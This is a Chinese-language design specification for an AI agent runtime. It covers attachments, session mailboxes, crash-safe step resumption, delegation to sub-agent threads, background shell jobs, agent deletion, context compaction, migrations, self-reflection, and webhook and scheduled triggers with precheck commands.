- **上传**：`POST /api/files?name=<名称>`，请求体就是文件内容，`Content-Type` 是它的类型（同 Matrix `/media/upload`，不用 multipart），边读边写边算 sha256，超过 `runtime.upload_max_bytes`（默认 50MB）立即停止。名称必须是单个路径段，不合法直接拒绝，不做修正。发消息时 `attachments` 带上 id（可以只有附件没有文字），`inbound.receive` 校验它们存在，记在消息信件上。
- **在消息里的两种形态**（`agent_runtime/attachments.py`）：存储形态是 `UserPromptPart` 里的 `ImageUrl` / `DocumentUrl`，url 即文件引用，数据库、界面、重放都用它；每次模型请求前由 pydantic-ai 的 `before_model_request` 钩子（`AttachmentsForModel`）展开成模型形态：一段说明（名称、类型、大小、工作目录里的路径），可内联的图片（png/jpeg/gif/webp）再附上内容。展开只替换这一次请求的消息列表，持久化的历史不变，所以文件内容在数据库里没有副本。模型不支持图片时，provider 的报错让运行失败，不悄悄丢掉图片。
- **交给工具**：信件交给模型时把附件复制到 agent 工作目录的 `uploads/<id>/<名称>`（重试时覆盖成原件），供文件工具与 shell 处理；这是派生副本，原件只在文件存储里。
- **agent 发出文件**：`share_file(path)` 把工作目录里的文件存一份快照，通过 `ToolReturn.metadata`（`conventions.TOOL_ATTACHMENTS`）挂到这次工具结果上。metadata 不发给模型、随消息持久化，所以文件一定显示给用户（图片内联、其他为下载链接，显示在过程组外），不依赖模型在回答里转写引用；模型只收到一句「已发给用户」。任何工具都可以用同一约定挂文件。临时 agent 与 `ask_agent` 的被问 agent 挂上的文件，随调用方那次工具调用的结果一起交给用户（`agent_runtime/answers.py`），出现在用户正在看的会话里。
- **一致性**：内容先写临时文件再改名到最终位置，之后才插入元数据行；失败即上传失败，没有 id 就没有引用。中途被杀留下的临时文件由启动时 `FileStore.recover` 清掉；有内容没元数据的孤儿只占空间，访问不到，同样内容再上传时复用。

### 会话信箱（`sessions/mailbox.py`、`sessions/consumer.py`）

每个会话是一个**信箱**加一个**消费者**。一切要交给 agent 的东西都是往信箱里投一封信件：用户消息（含附件）、对提问的回答、触发器与委派来的任务、后台任务的完成与检查、thread 交回的结果，按到达顺序排列。消费者把信件喂给模型：信箱里有信件就开始一次**运行**（一条 run task，payload 只记交给过它的最大信件 id `through_mail_id`：投递时信箱里最大的，运行开头取走了更新的信件时推进到那里（`hand_over_in`）；输入都在信箱里），把排着的信件交给模型；每次请求模型之前，把这期间新到的信件接在工具结果后面一起交给模型（同 Claude Code：两次工具调用之间就能处理，不等这次运行结束）；模型不再调用工具时这次运行结束，信箱里还有信件就接着跑下一次。异步工作（后台 shell、交回结局的委派）发起后立即返回，结局与运行中检查都只是往发起方的信箱里投信（见上文「占用与结清」）。

- **信件交给模型的样子**：消息是原文加附件引用；事件是用户消息内容里独立的一段（`conventions.format_event`，`<event source="job:12">…</event>`），那条请求的 metadata 记下是第几段（`RUN_EVENTS`，`sessions.content` 构造内容时就记下，不从文字反推），界面据此把事件单独显示；一次请求里的信件都并进同一段用户消息。
- **每一步保存**（`sessions/steps.py`）：一步 = 一次模型请求及其返回的工具调用。请求模型之前，这次请求与它带上的信件（记为已处理，`consumed_by` 是这次运行）在同一个事务里提交；模型回复之后提交这条回复。失败或进程重启后从上一步续跑（见第 5 节）。pydantic-ai 在运行开始时会规整传入的历史（合并相邻的请求、补齐悬空调用的结果，从请求续跑时取出末尾那条准备重发），条数可能和库里不同，所以「已保存到哪」的基准在规整之后取（`StepHooks.started`）。请求模型之前上下文超过压缩阈值时，这次请求照常保存为一步，然后停下驱动、压缩、从库里重新加载上下文续跑（见第 11 节），之后历史只在末尾追加。
- **从哪里开始**（`Consumer._opening`）：历史停在挂起的调用上时不是续跑，哪怕末尾是一条请求——挂起的调用与别的工具在同一个回复里时，pydantic-ai 以挂起结束时把别的工具的结果追加成一条请求，这时回答（或跳过）作为 `DeferredToolResults` 交回，pydantic-ai 把已有结果的调用跳过。否则历史停在没得到回复、没标停止的请求上就重发它。

  停在带工具调用的回复上（这一步在执行工具时被打断：进程退出，或这一步失败）时**不重新执行这些调用**：副作用（shell、通知、委派、改记忆）可能已经发生，而我们无从知道——事故 2026-10-21：一条 `run_shell` 重启了服务，恢复的运行把它重放一遍，又重启一次，同一条 run task 恢复到第 66 次。改为给这些调用补上「被中断、没有重新执行」的结果（`history.interrupted_results`，`outcome='interrupted'`，文字告诉模型「可能已经生效，先查再决定要不要重做」），经保存一步的同一条路径写进历史（不留悬空的调用），这次运行从这条补出来的请求重发（`RunState.resending`），模型看着结果自己决定。挂起的调用本身不补（它们在等回信，结果由 `DeferredToolResults` 交回），但和它们在同一个回复里、被打断的其他调用照样补：回答到达时 pydantic-ai 把末尾请求里已有结果的调用标为跳过，那个工具不会被再执行一遍。没出结果的调用**全是**还没交出去的 `ask_agent` 时照旧重新执行（`consumer.interrupted_calls`：按调用 id 幂等，没有别的副作用），只要有一个不能重放就整步都补结果——pydantic-ai 续跑时要么执行这条回复里所有没结果的调用、要么一个都不执行，挑不出单独一个来。
- **续跑接管**：一次运行最终失败后，新到的信件会唤醒新的运行；它从失败处续跑（历史末尾是失败那次保存的步骤），也接管那次运行处理过的信件——推送由它做（委派的失败已经交回过，不再交回）。之后再重试那次失败的运行时，它没有可交给模型的、历史末尾也不是它保存的，什么都不做。
- **唤醒**（`wake_in`，唯一规则）：会话里有排队的信件、没有排队或运行中的运行，并且有信件在最近一次运行之后才到（按信件 id：比那次运行记下的 `through_mail_id` 大，读写只在 mailbox 一处，不比较两张表的时间）；会话停在挂起的调用上时按 `pending.waiting` 判断（见「挂起的调用」）。最后一条保证最终失败的运行不会因为同一批信件被无限重新投递：它被重试、或之后新信件到达时再处理。调用方：投信时（`post_in`）、一次运行结束时（它的收尾事务里，这时队列还没把它记为完成，所以把它排除在「忙」之外，也不做「之后才到」的判断：剩下的信件一定要有下一次运行）、一次运行最终失败时（`RunHandler.failed_in` 结清之后；这时它已记为 failed，照常做「之后才到」的判断）、定期对账（`MailReconciler`，每 30 秒，兜住投信时事务失败、进程重启这类没有及时唤醒的情况）。
- **会话种类**：私有 thread 用户只读（用户消息拒绝，`KindPolicy.user_writable`），其余与普通会话相同。
- **记录**：已处理与被丢弃的信件只作记录（内容已随那一步的消息保存）；排队查询只看 `state = queued` 的行（部分索引）。会话接口给出排队中的信件（界面上显示为待处理）和最近一次停止丢弃的信件（划掉显示）。

## 8. 委派（`sessions/delegation.py`）

做法同 Claude Code 的子 agent：`ask_agent` 与 `delegate_task(report_back: true)` 都是要交回结局的委派。委派完全在会话领域里，由两个对称的事务完成，状态分在两侧、各管一件事：**发起方的占用**（active / released / cleared）记这项委派还要不要交回；**thread 一侧以 holder 为关联 id 的信件**上的 `mail.correlation_settled` 记这个关联有没有结清过，保证只结清一次（第 7 节「关联与结清」）。做这项工作的 thread 由这些信件推出，不另存。普通 `delegate_task`（不交回）不产生委派：`Threads.send` 只往公开 thread 投一封用户在等的信。委派工具（`delegate_task`、`ask_agent`、`list_threads`、`stop_thread`、`list_agents`）在 `sessions/delegation_tools.py`。

- **发出**（工具里，`Threads.dispatch`，一个事务）：校验并打开或找到 thread（同名续聊，agent 或种类不符抛出可纠正的 `InvalidInput`，事务回滚、什么都没写）；在发起方登记占用（holder 由工具调用 id 确定性派生，带 `call_id` 与「用户是否在等发起方」）；往 thread 投一封以 holder 为关联 id 的信件。然后 `ask_agent` 抛出 `CallDeferred` 挂起，`delegate_task(report_back)` 返回。续跑重新执行这次调用时按 holder 幂等，只返回已经投递到的 thread。
- **交回**（`hand_back_in`，thread 结清关联的同一个事务里，第 7 节「关联与结清」）：按 holder 找到发起方的占用，经 `deliver_in` 交回结局并释放占用。每个关联只结清一次，所以每项委派只交回一次；占用已 cleared（发起方被停止）不投，占用随发起方删除了就没有收件人（记日志）。没有中间状态，没有事件、没有投递顺序要证明。
- **交回的形态**：发起方还停在那次 `ask_agent` 调用上时，结局是一封回答信件，作为调用的结果交回（`AgentAnswer`：回答文字、它挂给用户的文件、thread，经 `agent_runtime.answers` 带上 `TOOL_THREADS` 与 `TOOL_ATTACHMENTS`）；否则（`report_back`，或用户已经跳过了那次调用）是一封事件信件（来源 `thread:<子会话 id>`）。thread 的回答不直接推送给用户：交给父 agent 处理，父会话处理它的运行按 `awaited` 推送。
- **发起方被停止**：停止事务清掉它的委派占用，并给做这些工作的 thread 各发一条定向命令 `StopThread`；thread 的停止再停下它自己委派出去的 thread（逐层）。thread 被停止时的结清看到占用已 cleared，不投。
- **运行中检查**（`ThreadChecks`）：发起方没停在这次调用上时（它在等时检查信件交不到模型），给发起方投检查信件，内容按 thread 的工作状态说（running：在跑多久了、在等重试或还排着；waiting：在等它自己开出的后台任务、委派或提问的回答）。委派没结清时 thread 也可能是 idle（信件到了，投信或运行结束——含最终失败——时的唤醒没做成，例如事务失败、重启，要等定期对账补唤醒下一次运行），这时与还排着同样说「排着、还没开始」。
- **`list_threads`**：每个 thread 的工作状态（同一条规则，批量）、最近一次运行最终失败时的错误、它最近的回答。不按最近一次运行判断做没做完：thread 在等自己开出的工作时最近一次运行已经做完，那时的回答只是中间的。

## 9. 后台任务（`jobs/`）

做法同 Claude Code 的后台 bash：`run_shell(background: true)` 立即返回任务 id，命令在后台跑，不占住运行、不设时限（同步的 `run_shell` 仍有上限，因为它占着运行）。任务属于发起它的会话，它的消息都作为事件信件（来源 `job:<id>`）投进这个会话的信箱。会话版的工作区工具（`jobs.tools.session_workspace_toolset`）由运行时的文件工具与前台 shell 加上后台执行、`job_status`、`job_kill` 组成；反思与临时 agent 没有会话、没有信箱接收事件，它们的工具组合里没有后台任务。

- **发起**：插入 job 行（running），同一事务把它记为「启动中」（进程内）→ 在会话上登记占用 `job:<id>`（会话领域自己的事务）→ 启动进程 → 登记监督者、记下 pid。启动失败或被取消时在屏蔽作用域里清理（第 4 节），**没有监督者的任务行只有一条收敛规则**（`_close_unsupervised_in`，启动失败、监督意外结束、崩溃后启动共用）：会话还在而上面从没登记过占用，说明任务没开始过，删掉这一行；否则记为被中断，交回会话并释放占用（会话已删除时交回得到 `GONE`，行保留终态）。运行中检查前先对账：记为运行中、却既不在监督之下、也不在启动中的任务按这条规则收敛。
- **结束**：进程退出（或被 `job_kill` 结束）时，在一个事务里记下状态与退出码，同一事务发出定向命令 `WorkEnded`：会话投一封完成事件（退出码、运行时长、命令、最后几行输出、日志路径）并释放占用。用户是否在等完成事件随发起任务的那次运行，登记占用时记在占用上。
- **运行中检查**：在确认任务仍在运行（在监督之下、状态 running）的事务里发出 `WorkCheckIn`（已运行多久、最后几行输出），不推送；agent 据此决定继续等还是 `job_kill`。不限制频率与任务数（按用户决定）。
- **输出**：stdout 与 stderr 合并，逐块脱敏（注入的 secret 替换为 `[secret:KEY]`，`platform.shell.redact` 一遍正则、同一位置最长优先；每块末尾只留下恰好是某个 secret 开头的一段等下一块，切口避开 secret，多行 secret 跨块也不漏）后写进 agent 工作目录的 `jobs/<id>.log`，agent 用 `read_file` 读完整输出，`job_status` 看状态与最后几行。以进程退出为准（不是输出管道关闭）。
- **进程**：自成进程组（`platform.shell.spawn_bash`，与同步 shell 共用环境与 secret 注入），`job_kill` 与关停杀掉整棵进程树。
- **重启**：正常关停时杀掉所有后台任务并记为被中断；启动时（worker 开始之前）把还记为运行中的任务记为被中断并告诉 agent，进程可能还活着（pid 可能已被复用），如实告知怎么核实，不盲杀。
- **停止**：订阅 `SessionStopped`，结束被清掉的占用对应的进程组；结局照常记进自己的行，`WorkEnded` 看到占用已 cleared 不投信。job 行永久保留，会话删除时也不删。

## 10. 删除 agent

1. `AgentLifecycle.delete`：组合根注入的删除阻止查询有一个为真时拒绝（409）——它的会话有忙的（与删除会话同一条规则，会话领域的 `SessionActivity.blocks_agent_deletion_in`）、它的反思在排队或执行（反思领域的 `blocks_agent_deletion_in`）；agent 领域不知道别的领域的 lane；否则把 agent 标为正在删除（`deleting_by`，不出现在列表与名称解析里），同一事务发布 `AgentDeleting`。各领域为 agent 写数据库数据（会话来信与手动压缩、委派、secret、触发器）之前在同一事务里用 `active_agent_in` 检查，正在删除的按不存在处理：事务串行，检查与写入之间插不进删除，删除流程的清理一定看得到这次写入。私有资源（skill、记忆、指令、MCP 配置）不在数据库事务里：由各 store 在资源仓库的锁里、写入之前检查（`agents.active.ActiveOwners`，经 `ResourceRepo.apply/update` 的 precondition），删除流程在提交删除标记之后、在同一把锁里删掉资源目录，所以检查通过的写入一定落在删除之前、被一起删掉。HTTP 层在读 owner 的私有资源、以及恢复它的历史版本之前按 `get_active` 把正在删除的当作不存在（恢复的写入照样由 store 在锁里检查）。
2. 订阅者：
   - 会话：删除它的全部会话（连同私有 thread），发布 `AgentSessionsCleared`（没有会话时立即发布）。标记一提交就不再为它新排工作，但仍可能有会话忙：删除前的检查与标记分属两个事务，之间来的信件排上的运行会在标记之后执行、可能开出后台任务或委派；人为重跑它的任务也会。处理器先停止这些会话（每个只停一次；它们的工作随 agent 一起放弃），再在时限内（30 秒）等它们空闲——正在执行的运行被取消后，停止事务在它退出之后才执行，正在执行的压缩做完才空闲——然后删除。时限内没有空闲就按暂时失败重试，重试时同样先停止再等；重试用完时投递记为 failed，可见，人工重试。
   - 反思：结束该 agent 排队的反思任务，删除检查点与记录；正在执行的反思结束时发现 agent 正在删除，不写记录。
   - 触发器、vault：删除它的触发器与私有 secret。
3. agent 领域订阅 `AgentSessionsCleared`：再问一遍同一组删除阻止查询（会话已经删光，剩下的只可能是正在执行的反思），还有就等（暂时失败重试），否则删除工作目录、资源目录与这一行。工作目录删不干净（例如它留在后台的进程还在往里写）只记 warning、照常删除：残留文件只占空间，不能让 agent 卡在正在删除；启动检查把已删除 agent 留下的工作目录与资源目录一起列进日志，由人清理。

## 11. 上下文压缩

与模型提供方无关的统一机制（`sessions/compaction.py`）。pydantic-ai 只为 Anthropic 与 OpenAI Responses 提供原生压缩，`openai` 兼容接口和 Gemini 没有，按提供方分支会产生两套语义，所以统一自己实现：

- **触发**：发给模型的上下文（上一次模型请求的输入 token，pydantic-ai 已计入缓存 token）超过 `runtime.compaction_threshold_tokens` 时，由消费者在步与步之间压缩：运行开始时，以及每次请求模型之前（这次请求照常保存为一步，然后停下驱动、压缩、从库里重新加载上下文续跑，pydantic-ai 重发末尾那条请求）。「该不该压缩」只有一条规则（`Compactor.verdict`）：只认最近一次压缩之后的回复报告的 token 数（之前的反映的是压缩前的上下文，按压缩记录的 `at_message_id` 推导）；压缩后的第一次回复就超阈值，说明保留窗口本身就超了，这次运行不再压缩，上下文继续变大直到超出模型的上限时运行失败可见，重试时重新判断。模型不返回 usage（部分 OpenAI 兼容服务流式时如此）时记 warn 日志，自动压缩对该模型失效。也可在会话页手动触发：同一个会话 lane 上的一个 `compaction` task，处理器只调用同一个压缩方法。
- **执行**：把最近 `runtime.compaction_keep_steps` 步之前的消息连同上一份摘要交给该 agent 的模型总结，写入 `compactions` 表（`through_message_id` + `summary`）。切点在步与步之间、之前的消息里没有悬空调用的地方（`compaction.steps_of`）：工具调用与其结果、挂起的调用与之后的回答不会被拆开；一次运行中途也有切点（每一批工具结果之后），长任务在运行中也能压缩。单次只取总长不超过上限的最早若干步，不截断内容，剩下的接着压缩，直到保留窗口之外没有可压缩的。
- **使用**：发给模型的上下文 = 最新摘要（放进 instructions）+ 切点之后的原始消息（`sessions.history.load_context`；切点之后的第一条是回复时，前面补一条说明「接着之前的工作」的请求）。原始消息不删除，UI 显示完整原文并标出压缩点；反思读取的仍是原始消息。

## 12. 数据库迁移

Alembic 管理表结构（`src/muliao/migrations/`，随包分发），启动时自动升级到最新版本。整个升级在一个真正的事务里：pysqlite 默认只在 DML 前隐式开事务、DDL 逐条自动提交，所以迁移使用独立连接，驱动设为 autocommit 并显式 `BEGIN IMMEDIATE`，任何失败都完整回滚。SQLite 改表用 batch 模式（建新表-拷数据-删旧表），迁移连接在建立时关闭外键以免删旧表时级联删除子表数据，提交前执行 `foreign_key_check`，有违例则回滚。`tests/test_migrations.py` 保证迁移后的结构与模型定义一致。

2026-10-20 按领域重构时用户决定不做数据迁移：迁移历史重置为唯一的初始版本，上线时重建生产库。此后每次结构变化新增一个迁移，已部署的数据只通过迁移升级，不删库。

## 13. 进化机制

### Skill
agent 在任何一次运行里都可以主动 `write_skill`。公共 skill 对所有 agent 可见；私有 skill 只对自己可见，同名时私有遮蔽公共。

**归属与合并规则（skill、MCP server、secret 共用，只在 `ownership.shadowing` 实现一次，`visible` 由它得出）**：资源归属某个 agent（私有）或公共；agent 看到自己的私有资源加上公共资源，同名时私有遮蔽公共，其他 agent 的私有资源不可见。prompt 不是按名称合并，而是公共 prompt 与 agent 指令拼接（见下）。「私有」是可见范围和命名空间的划分，不是安全隔离：agent 能执行任意命令、读到数据库与 vault 主密钥（见第 15 节）。界面按同一条规则安排归属位置：管理菜单（左上角按钮打开）的「公共资源」组只管理公共资源（公共指令、公共 Skills、公共 MCP servers、公共 Vault），私有资源在 agent 详情页的 Skills / MCP / Secrets 标签里管理，下方只读列出该 agent 继承的公共项并标出被同名私有项覆盖的。MCP 与 vault 的列表接口按 owner 视角返回（`GET /api/mcp?owner=`、`/api/vault?owner=`：私有在前、公共在后），公共项是否被遮蔽由后端给出 `shadowed`（MCP 只有已启用的私有 server 才遮蔽，与运行时一致）；前端 `web/src/ownership.ts` 只按归属把列表分成两段，不实现遮蔽规则。

### Prompt（公共 prompt 与 agent 指令）
agent 的指令是资源仓库里的 `agents/<id>/PROMPT.md`，公共 prompt 是 `public/PROMPT.md`（合并进所有 agent，放在各自的指令之前）。当前生效的就是文件内容（`agents` 表里没有指令列），读写都经过 `PromptStore`；修改即提交一版并记录作者（`user` 或做出修改的 agent），回滚即把旧版内容作为新的一版写入，历史只增不改。内容未变时不提交；空的公共 prompt 等同于没有（清空也提交一版空文件，历史里不会出现「文件不存在」的版本）。指令与记忆的历史和恢复通过 `/api/resources/{prompt|memory}/history|restore`，界面在公共指令页和 agent 的配置、记忆标签里；接口只列最近 50 版，更早的仍在仓库里。

### Memory
agent 私有、有长度上限（`memory_max_chars`），每次运行全文注入 instructions。

### 强制反思（reflection）
反思可以更新记忆、私有 skill（有 `public_skills` 时也可写公共 skill），以及自己的指令（`instructions_replace`，只做小而准的修改）；这三者都是资源仓库里的文件，每次修改都有版本，用户可回滚。
- 按 **agent** 的**步数**调度（反思领域，`reflection/service.py` 的 `ReflectionScheduler`，订阅 `RunEnded`）：每次运行结束时数一次该 agent 自检查点以来的模型回复条数（每条回复就是一步），由 `messages` 表推导（会话领域的查询 `sessions.agent_history.AgentHistory`，步数与区间上界取自同一个快照），不另存计数。达到该 agent 的 `reflect_every`（默认 `runtime.default_reflect_every` = 30 步）时，反思领域在处理 `RunEnded` 的事务里把检查点（`reflection_checkpoints`）推进到当前最大消息 id，并投递一个 reflection task，载荷是消息 id 区间 `(from_id, to_id]`。按步而不按运行：一次长运行与几次短运行做的事差别很大，步数更接近工作量。
- 选择 agent 级而不是 session 级：定时触发每次都是一个新 session，只有一次运行，按 session 计数永远到不了阈值。
- ReflectionHandler 把这个区间内该 agent 所有会话消息渲染成文字记录，连同固定的反思提示交给同一个 agent 运行，只开放自我改进的工具（记忆、私有 skill、自己的指令，加上该 agent 已有的写公共 skill）。没有需要修改的内容也要走完并给出结论。
- 反思的完整消息和结论写入 `reflections` 表，可在 UI 查看；不进入任何 session 的历史。

## 14. 触发源与通知

触发点有两类：用户在网页发起对话，以及触发器。agent 之间的委派是 agent 内部能力，在父会话下开 thread（第 7 节）。

**统一入口**：用户消息、触发器、agent 委派都是同一件事——把一段内容投进某个 agent 的某个会话的信箱。各来源只做适配（鉴权、触发时机、组装内容），然后构造一个 `Inbound` 交给 `inbound.receive`（用户消息与委派同步调用；触发器与 issue 经定向命令 `Receive`，见下文「投信」）：

| 字段 | 含义 |
|---|---|
| `origin` / `origin_ref` | 来源与具体发送方：用户（无）、触发器 id、issue id、委派方（父）会话 id；与会话上的同名字段是同一个概念（会话记的是发起它的那一个事件的来源） |
| `content` | 交给 agent 的内容 |
| `session` | 已有会话的 id（在其中继续）；`NewSession`（新建：agent、标题，委派时还有父会话、thread 名与种类；触发器经 `Receive` 投递时带预先分配的会话 id，好立即告诉调用方）；或 `SessionKey`（按发送方定位：这个发送方给这个 agent 开过的最新一个顶层会话，没有就以给定标题新建——发送方不用存会话 id，issue 用它让每个（issue, agent）对应唯一一个会话） |
| `awaited` | 用户是否在等它的回答（处理它的运行结束时推送） |
| `attachments` / `answers` | 用户随消息发送的文件、对挂起提问的回答（只有用户会带） |

`receive` 是外部来信投进信箱的唯一入口（委派的 `Threads.send` / `dispatch` 也经过它；代码里的生产者——占用的结局 `deliver_in`、运行中检查 `post_check_in`——直接 `mailbox.post_in`），校验规则与别的领域投信用的 `receive_command_in` 是同一个函数；新建会话也只有 `create_session` 一处实现。**续写规则**：用户可以在任何用户能写的会话里继续（`KindPolicy.user_writable`）；其他来源只能续写自己发起的会话（会话的来源与发送方都一致，委派会话的发送方就是它的父会话），否则 403。发送方身份是触发器 id（AUTOINCREMENT，删除后不复用）或父会话 id。

是否推送由信件的 `awaited` 决定（唯一来源），由投信的入口设置：

| 入口 | session 策略 | `awaited` |
|---|---|---|
| 用户发起 / 回复 | 新建；回复沿用（私有 thread 只读） | 是（iOS 要求每个 push 都展示通知，所以页面可见时也会弹） |
| 触发器 | 默认每次新建，`origin_ref` 记触发器；带回会话 id 的事件在原会话里续写（只能续写本触发器发起的会话） | 否，需要通知时 agent 调 `notify_user` |
| `delegate_task` | 父会话下的公开 thread，同名续聊 | 是；`report_back` 时否（结果交回父会话） |
| `ask_agent` | 父会话下的私有 thread，同名续聊 | 否（回答作为工具结果交给发问方） |

**触发器**：具名、持久的事件来源（`triggers` 表）。公共字段只有名称、agent、处理说明、启用、归档（见下）与最近一次触发的记录；怎么被触发由 `kind` 决定，**只在代码里多态实现**，表里不为某种方式开专门的列：`config`（JSON）是这种方式的配置，`state`（JSON）是这种方式自己维护的运行状态。每种方式分两部分：

- `TriggerKind`（纯逻辑，注册给 `TriggerService`）：校验并规范化 `config`、由配置推导 `state`、给出展示用的运行状态（每种方式一个 pydantic 类型，不含凭证）。推导在创建、修改配置与停用后重新启用时进行，由 `TriggerService` 合并进已有 `state`（实现不负责保留与配置无关的部分，如 token 摘要）；
- 激活机制：怎么被触发，都只调用 `TriggerService.fire`（唯一出口，先跑前置检查，见下）组装成事件交给统一入口；需要感知触发器变化的激活机制各自 `watch()` 一个通知，互不干扰；某种方式专有的接口放在它自己的 API 模块（如 `api/webhook.py`）。

新增一种方式（例如消息队列）= 一个 `TriggerKind` + 它的激活机制（消费循环），在组合根注册并启动；表、工具、统一入口都不用改；HTTP 接口的 `TriggerOut` 是按 `kind` 区分的联合类型（每种方式的 config 与 status 各有类型，`TriggerKindName` 列出全部方式，测试校验它与注册的方式一致），所以要在 `api/triggers.py` 加一个成员，界面（`pages/Triggers.tsx` 按 kind 的穷举 switch）也要补上这种方式的编辑器与状态展示，漏了编译器会报。现有三种：

| kind | config | state | 激活机制 |
|---|---|---|---|
| `schedule` | `{"cron": "<5 段表达式>"}`，按配置的时区解释 | `next_run_at` | `DueRunner` + `ScheduleDue`：消耗这次到期 = 推进到下次时间；上一次触发的会话不空闲时跳过本次（会话领域的工作状态 `SessionActivity.work_state_in` 不是 idle：在运行、有还没投递的 `Receive`，或在等后台任务、委派、用户回答）；停机期间错过的只补一次，暂停期间错过的不补（重新启用时从当时算起） |
| `once` | `{"at": "<ISO 8601 时间>"}`，不带时区的按配置的时区解释，创建时必须在将来 | `{}`（到期时间就是配置本身） | `DueRunner` + `OnceDue`：消耗这次到期 = 归档（`finished_at`）。到点只触发一次，之后从列表里消失 |
| `webhook` | `{}` | `token_hash` | `Webhooks`：`POST /api/hooks/{name}[?session_id=]` 凭 token 鉴权 |

**按到期时间触发**（`triggers/due.py`，`schedule` 与 `once` 共用）：`DueRunner` 一个循环扫描所有还会到期的触发器，到期的并发触发。每种方式只给出两件事（`DueKind`）：到期时间从哪来（`due_at`），以及**消耗这次到期**时这一行怎么变（`consume_in`：定时推进到下次，一次性归档）。消耗与触发不在一个事务里（触发可能先跑前置检查，不能占着事务）：先提交消耗，再调用 `fire`，所以进程恰好死在两者之间时这一次被跳过，**至多触发一次**；触发前按最新的行重新判断（列出之后被删除、停用、归档或改了配置就跳过）；触发被拒绝时停用并记 `disabled_reason`（经 `TriggerService.disable`，和别的修改一样通知监听者）；存下的配置或状态坏了、算不出到期时间的（`due_at` / `consume_in` 抛 `CorruptState`）同样只停用这一个，扫描循环照常继续。

**归档**（`finished_at`，触发器的公共概念，不属于某一种方式）：这个触发器不会再触发了。一次性触发器在它那次到期被消耗时归档——无论随后是真的投递、前置检查判定没事，还是触发失败（失败另记 `disabled_reason`）。归档之后：不出现在默认列表（`trigger_list`、`GET /triggers`、界面主列表），不能再 `update` / 启用 / 立即运行（`Conflict`），可以删除；名称只在**未归档**的触发器之间唯一（部分唯一索引 `WHERE finished_at IS NULL`），所以同名的可以重新创建，按名称（`get_by_name`、webhook 的鉴权）找到的也只有未归档的那个。行永久保留，`id` 永不复用，它发起过的会话（`origin='trigger'`、`origin_ref` 是它的 id）因此一直查得到是谁发的：`GET /triggers?finished=true` 列出归档的，`GET /sessions?origin=trigger&origin_ref=<id>` 列出某个触发器发起过的会话（走会话领域的查询，触发器领域不碰 `sessions` 表），`trigger_list(finished=true)` 让 agent 查一次性任务的结果（带 `finished_at` 与 `last_session_id`）。

「立即运行一次」（`TriggerService.run`，界面按钮与 `trigger_run`）是**管理操作**，不是激活机制：它不消耗一次性触发器预定的那一次（到点仍会触发），并且拒绝已归档的；激活机制走 `fire`。

**前置检查**（`triggers/precheck.py`，所有触发方式共用，触发器的公共字段 `precheck`）：做法同 Hermes 的 script / monitor 模式——触发前先跑一条便宜、确定性的命令，有事才调用 agent，没事不花模型调用。命令在该 agent 的工作目录里用 `bash -o pipefail` 执行（管道里任何一步失败都算检查失败：`curl … | jq` 里 curl 失败时 jq 照样退出 0，否则故障会变成静默的「没事」；与 `run_shell` 共用 `platform/shell.py`：最小环境变量、按 key 注入 secret、输出里的 secret 替换掉、超时杀进程组），stdin 是原始事件内容（webhook 请求体，定时与手动为空），在数据库事务之外执行，时限 `runtime.precheck_timeout_seconds`（默认 30 秒：webhook 的调用方在同步等它，检查本该便宜），这个时限写进 `trigger_create` 的工具说明，agent 写检查脚本时知道上限（包括重试在内）。同一轮到期的定时触发器并发执行，一个慢的检查不拖住其他触发器。退出码 0 时按 `fire_when` 决定（`decide`，纯逻辑）：
- `output`（默认）：输出非空就触发，输出作为事件内容交给 agent（替换原始事件，可借此过滤、裁剪）；为空不触发。增量由命令自己做（游标存在工作目录）。
- `changed`：与上一次成功检查的输出（存在触发器的 `precheck_output`）逐字比较，变了才触发，交给 agent 的是统一 diff 加完整输出（所以实际可用的输出上限约为事件上限的一半）；命令只需打印当前状态。第一次运行只记基线、不触发（Hermes 首轮会白调一次模型）。修改前置检查时清空基线。
- 非 0 退出、超时、输出（或 diff 加输出）超过事件上限、secret 不可见：检查本身失败，不触发，原因记在 `precheck_error`，触发器保持启用（脚本的故障往往是暂时的）；从正常变为出错时发一条通知（定向命令 `Notify`，与记下失败同一事务）（不调用模型，记在通知页，见下文「通知」），之后持续出错不再重复推送，检查成功即清除。webhook 的外部调用方只收到 502，看不到原因（可能含脚本的 stderr）。
- 检查期间触发器被删除、停用或改了检查，这次结果作废，成功与失败都一样（旧命令的失败不会记到新配置上）。同一个触发器的两次检查恰好并发（如手动运行撞上定时）时，后提交的以先提交的输出为基线，最坏多触发一次，自然收敛，不加锁。`last_checked_at` 记最近一次检查的时间，让用户看到「在检查、只是没事」。
- 不提供 Hermes 的 no_agent（输出原样推送、不经过 agent）：它绕过「一切都经过会话」，推送的内容不属于任何会话；需要省模型调用时用 `changed` 只在变化时叫 agent。

**投信**：别的领域投信只有一个入口 `sessions.api.receive_command_in`（只读：校验来信、返回定向命令 `Receive`，发送方在同一事务里 `send_in`）。`TriggerService.fire` 在触发器自己的事务里校验来信（读的会话、agent、文件都是只会单向变化或不变的事实，不合规当场报错给调用方）、记下触发（时间、前置检查的输出、上一次的会话），同一事务发出定向命令 `Receive`（新建会话的 id 在这里预先分配），由会话领域在自己的事务里投信：记下触发与投信都恰好一次。提交之后马上执行这条投递（`Worker.run_now`），通常返回时会话已经存在，调用方可以立即续写；做不到（lane 正忙）就由 worker 稍后投递，这期间续写它会得到 404。`Receive` 按目标会话分 lane，同一会话的来信按发送顺序投递；按 `SessionKey` 定位的投递在会话存在之前就要有 lane，按 key（来源、发送方、agent）命名，同一个 key 串行，「没有就建」不会建出两个会话（工作状态也看这条 lane 上没投递的来信；会话还没建出来、信还排着时算 running，`SessionActivity.keyed_work_states_in`）。按 key 投信的发送方（issue）只用 key 投，不按会话 id 续写它的会话，所以同一会话的来信只在一条 lane 上、顺序不乱。投递时会话或 agent 已被删除就丢弃并记日志。投递处理器自己的失败按队列规则记账（重试或失败可见），不抛给调用方；只有领取这条投递时出错（如数据库暂时不可用）请求才报错，投递仍由 worker 完成，外部调用方此时重试会多触发一次。

任何未归档的触发器都可以在界面上或用 `trigger_run` 立即运行一次（不带事件内容）；有前置检查时同样先跑检查，可以用来测试整条链路。事件内容（若有）原样附在处理说明之后：

```
<处理说明>

<event>
<请求体>
</event>
```

**webhook**：
- 带 `Authorization: Bearer <token>`，响应 `{"session_id": ...}`；请求体为 UTF-8 文本，最多 256 KiB。
- 不走登录 cookie，**先鉴权再读请求体**：未鉴权的调用方不能让进程读入任何内容；请求体按字节上限分块读取，超限返回 413。触发器不存在、不是 webhook、还没有 token、token 不匹配，都返回同一个 401，不暴露哪些名称存在；停用的返回 409；续写不是本触发器发起的会话返回 403。
